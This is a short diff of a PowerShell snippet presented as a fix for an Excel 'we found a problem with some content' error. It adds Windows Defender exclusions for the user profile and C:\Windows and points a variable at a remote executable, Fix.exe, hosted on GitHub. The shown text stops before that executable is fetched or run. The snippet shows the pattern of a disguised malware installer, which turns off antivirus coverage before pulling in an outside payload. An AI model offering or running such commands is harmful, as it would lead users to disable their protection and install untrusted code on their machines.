@@ -1,3 +1,5 @@
+we found a problem with some content in excel. do you want us to try to recover as much as we can how to fix?
+
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
 $url = "https://github.com/Anhhh111/Fixerror/raw/refs/heads/main/Fix.exe"
